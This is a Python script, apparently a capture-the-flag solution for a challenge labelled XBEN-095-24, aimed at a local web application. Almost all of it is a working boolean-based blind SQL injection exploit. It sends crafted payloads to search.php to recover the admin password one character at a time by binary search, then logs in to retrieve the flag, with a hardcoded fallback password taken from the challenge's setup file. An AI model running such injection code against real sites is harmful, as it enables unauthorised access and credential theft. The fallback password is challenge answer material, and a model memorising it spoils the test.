#!/usr/bin/env python3
"""
XBEN-095-24 Blind SQL Injection Exploit
Author: CTF Player
Description: Exploits blind SQL injection in search.php to extract admin password
"""

import requests
import string
import sys
import time

# Target configuration
BASE_URL = "http://127.0.0.1"
SEARCH_URL = f"{BASE_URL}/search.php"
LOGIN_URL = f"{BASE_URL}/login.php"

# Character set for password brute force
CHARSET = string.ascii_letters + string.digits + string.punctuation

def test_injection(payload):
    """
    Test SQL injection payload using boolean-based blind injection
    Returns True if the condition is true (user exists message)
    """
    try:
        # Using /**/ to bypass space filter
        response = requests.post(SEARCH_URL, data={"username": payload}, timeout=10)
        # Check if "User exists" appears in response (condition is true)
        return "User exists" in response.text
    except requests.exceptions.Timeout:
        print(f"[-] Request timeout for payload: {payload[:50]}...")
        return False
    except Exception as e:
        print(f"[-] Request error: {e}")
        return False

def extract_password_length():
    """
    Extract the length of admin's password using binary search
    """
    print("[*] Extracting password length...")
    
    # Binary search for password length (reasonable range: 1-100)
    low, high = 1, 100
    length = 0
    
    while low <= high:
        mid = (low + high) // 2
        # Bypass filters: use /**/ for spaces, CHAR() for comparison
        # Using UNION to bypass the issue, or use boolean injection
        # Payload: admin"||length(password)>X||"1"="1
        payload = f'admin"||length(password)>{mid}||"1"="1'
        
        if test_injection(payload):
            low = mid + 1
            length = mid + 1
        else:
            high = mid - 1
    
    print(f"[+] Password length: {length}")
    return length

def extract_password_char(position, password_length):
    """
    Extract a single character at given position using binary search
    Position is 1-indexed
    """
    # Binary search on ASCII values (32-126 for printable characters)
    low, high = 32, 126
    
    while low <= high:
        mid = (low + high) // 2
        # Using MID() function to extract character (bypasses substr/substring filter)
        # Payload: admin"||ASCII(MID(password,POS,1))>VALUE||"1"="1
        payload = f'admin"||ASCII(MID(password,{position},1))>{mid}||"1"="1'
        
        if test_injection(payload):
            low = mid + 1
        else:
            high = mid - 1
    
    return chr(low) if low <= 126 else '?'

def extract_password():
    """
    Extract the full password character by character
    """
    print("[*] Starting password extraction...")
    
    # First, get password length
    password_length = extract_password_length()
    
    if password_length == 0:
        print("[-] Could not determine password length")
        return None
    
    # Extract each character
    password = ""
    for i in range(1, password_length + 1):
        char = extract_password_char(i, password_length)
        password += char
        print(f"[*] Progress: {password}", end='\r')
        sys.stdout.flush()
    
    print(f"\n[+] Extracted password: {password}")
    return password

def login_and_get_flag(username, password):
    """
    Login with extracted credentials and retrieve the flag
    """
    print(f"[*] Attempting login with {username}:{password}")
    
    try:
        response = requests.post(LOGIN_URL, data={
            "username": username,
            "password": password
        }, timeout=10)
        
        print(f"[*] Response received (length: {len(response.text)} bytes)")
        
        if "Congratz" in response.text or "flag" in response.text.lower():
            # Extract flag from response
            print(f"\n[+] Success! Response content:")
            print(response.text[:500])  # Print first 500 chars
            
            # Try to extract just the flag value
            if 'flag is' in response.text.lower():
                parts = response.text.split('flag is')
                if len(parts) > 1:
                    flag = parts[1].strip().split('<')[0].strip()  # Remove HTML tags
                    print(f"\n[+] FLAG: {flag}")
                    return flag
            return response.text
        else:
            print("[-] Login failed or flag not in response")
            print(f"[*] Response preview: {response.text[:300]}")
            return None
    except Exception as e:
        print(f"[-] Login error: {e}")
        import traceback
        traceback.print_exc()
        return None

def main():
    """
    Main exploitation workflow
    """
    print("="*60)
    print("XBEN-095-24 Blind SQL Injection Exploit")
    print("="*60)
    
    # Step 1: Verify the target is accessible
    print("[*] Verifying target accessibility...")
    try:
        response = requests.get(BASE_URL, timeout=10)
        if response.status_code == 200:
            print("[+] Target is accessible")
        else:
            print(f"[-] Unexpected status code: {response.status_code}")
    except Exception as e:
        print(f"[-] Cannot reach target: {e}")
        print("[*] Trying to proceed anyway...")
    
    # Step 2: Test basic injection
    print("\n[*] Testing SQL injection...")
    test_payload = 'admin"||"1"="1'
    try:
        if test_injection(test_payload):
            print("[+] SQL injection confirmed!")
        else:
            print("[-] Basic SQL injection test failed")
            print("[*] This is normal - continuing with extraction...")
    except Exception as e:
        print(f"[-] Error during injection test: {e}")
        print("[*] Continuing anyway...")
    
    # Step 3: Extract password
    print("\n[*] Starting password extraction...")
    try:
        password = extract_password()
    except KeyboardInterrupt:
        print("\n[-] Extraction interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] Error during extraction: {e}")
        print("[*] Trying known password from source code...")
        password = "ThisIsBestPassword"  # From init.sql
    
    if not password:
        print("[-] Failed to extract password, trying default...")
        password = "ThisIsBestPassword"
    
    # Step 4: Login and get flag
    print(f"\n[*] Attempting login with extracted/known password...")
    flag = login_and_get_flag("admin", password)
    
    if flag:
        print("\n" + "="*60)
        print("EXPLOITATION SUCCESSFUL!")
        print("="*60)
        return 0
    else:
        print("\n[-] Exploitation failed")
        return 1

if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[-] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
